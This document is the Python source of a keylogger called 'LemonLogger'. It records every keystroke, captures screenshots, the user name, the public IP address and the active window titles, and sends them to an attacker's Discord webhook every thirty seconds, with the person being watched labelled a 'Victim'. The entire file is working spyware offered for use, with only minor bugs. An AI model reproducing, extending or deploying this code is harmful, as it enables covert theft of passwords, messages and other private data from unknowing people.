import time
from pynput.keyboard import Key, Listener
from discord_webhook import DiscordWebhook, DiscordEmbed
import getpass
from datetime import datetime
import socket
import requests
import tempfile
import subprocess
import os
import mss
import pygetwindow as gw
import atexit
# Keylogger that send all keys on a Discord Webhook, coded by Lamaie (github.com/lamaie)

# Here you set the Webhook
webhook = 'here you put your webhook'

# things
wh = DiscordWebhook(url=webhook, username="LemonLogger", rate_limit_retry=True)
wh2 = DiscordWebhook(url=webhook, username="LemonLogger", rate_limit_retry=True)
wh3 = DiscordWebhook(url=webhook, username="LemonLogger", rate_limit_retry=True)

# try to get screenshot before going offline to see why this happened
def take_screenshot_for_offline():
    with mss.mss() as sct:
        filename = tempfile.mktemp(".png")
        sct_img = sct.grab(sct.monitors[1])
        mss.tools.to_png(sct_img.rgb, sct_img.size, output=filename)
        return filename
screenshot_file_offline = take_screenshot_for_offline()

# offline
def exit_handler():
    exact_current_time = datetime.now().strftime("%H:%M:%S %d-%m-%Y")
    exit_embed = DiscordEmbed(title='LemonLogger - Victim is OFFLINE now', color='BE2525')
    exit_embed.add_embed_field(name='PC User Name: ', value=current_user)
    exit_embed.add_embed_field(name='IP Address: ', value=get_public_ip())
    exit_embed.add_embed_field(name='Time: ', value=exact_current_time)
    with open(screenshot_file_online, "rb") as f:
        wh3.add_file(file=f.read(), filename="offline.png")
    exit_embed.set_thumbnail(url='attachment://offline.png')
    wh3.remove_file(screenshot_file_offline)
    wh3.add_embed(exit_embed)
    try:
        response = wh3.execute()
    except Exception as e:
        print("Error:", e)
atexit.register(exit_handler)

# default values
key_logs = ""
current_user = getpass.getuser()


# get time of when it start collecting keys
current_time = ""
current_time += datetime.now().strftime("%H:%M:%S %d-%m-%Y")

# get IP of victim
def get_public_ip():
    public_ip = requests.get('https://api.ipify.org').text
    return public_ip

# make Screenshot of the screen at the time of starting service
def take_screenshot_for_online():
    with mss.mss() as sct:
        filename = tempfile.mktemp(".png")
        sct_img = sct.grab(sct.monitors[1])
        mss.tools.to_png(sct_img.rgb, sct_img.size, output=filename)
        return filename
screenshot_file_online = take_screenshot_for_online()

# embed when new victim is detected
def online_embed():
    exact_current_time1 = datetime.now().strftime("%H:%M:%S %d-%m-%Y")
    victimembed = DiscordEmbed(title='LemonLogger - Victim is ONLINE now', color='19CB0C')
    victimembed.add_embed_field(name='PC User Name: ', value=current_user)
    victimembed.add_embed_field(name='IP Address: ', value=get_public_ip())
    victimembed.add_embed_field(name='Time: ', value=exact_current_time1)
    with open(screenshot_file_online, "rb") as f:
        wh.add_file(file=f.read(), filename="online.png")
    victimembed.set_thumbnail(url='attachment://online.png')
    wh.remove_file(screenshot_file_online)
    wh.add_embed(victimembed)
    try:
        response = wh.execute()
    except Exception as e:
        print("Error:", e)
    global window_title
    window_title = ""
    window_title = gw.getActiveWindow().title
online_embed()

# here it gets the keys
def on_press(key):
    global key_logs
    global window_title
    exact_current_time = datetime.now().strftime("%H:%M:%S")
    window_title2 = gw.getActiveWindow().title
    if window_title2 == window_title:
        pass
    else:
        window_title += ("[") + exact_current_time + ("] - ") + window_title2 + "\n"
    ctrlc = "key.ctrl_l\x03"
    ctrl_c = ctrlc.encode("unicode_escape").decode("utf-8")
    ctrlv = "key.ctrl_l\x16"
    ctrl_v = ctrlv.encode("unicode_escape").decode("utf-8")
    key_string = str(key).lower().replace("'", "").replace("key.space", " ").replace("key.enter", " [ENTER] ").replace("key.caps_lock", " [CAPS] ").replace("key.shift", " [SHIFT] ").replace(ctrl_c, " [CTRL+C] ").replace(ctrl_v, " [CTRL+V] ").replace("key.ctrl_l\x03", " [CTRL+C] ").replace("key.ctrl_l", " [CTRL] ").replace("key.ctrl_r", " [CTRL] ")
    if 'backspace' in key_string:
        key_logs = key_logs[:-1]
    else:
        key_logs += key_string + ""

# here it send the keys
with Listener(on_press=on_press) as listener:
    counter = 0
    while True:
        if len(key_logs) > 0:
            embed = DiscordEmbed(title='LemonLogger', color='fff900')
            embed.add_embed_field(name='Keywords from '+ current_time, value=key_logs, inline=False)
            if len(window_title) < 0:
                try:
                    embed.add_embed_field(name='Windowses opened in that time: ', value=window_title, inline=False)
                except:
                    pass
            else:
                embed.add_embed_field(name='Windowses opened in that time: ',
                                      value="Something went wrong, I couldn't get them", inline=False)
            wh2.add_embed(embed)
            counter += 1
            if counter == 9:
                response = wh2.execute(remove_embeds=True)
                counter = 0
            try:
                response = wh2.execute()
            except Exception as e:
                print("Error:", e)
        window_title = ""
        key_logs = ""
        current_time = ""
        current_time += datetime.now().strftime("%H:%M:%S %d-%m-%Y")
        time.sleep(30)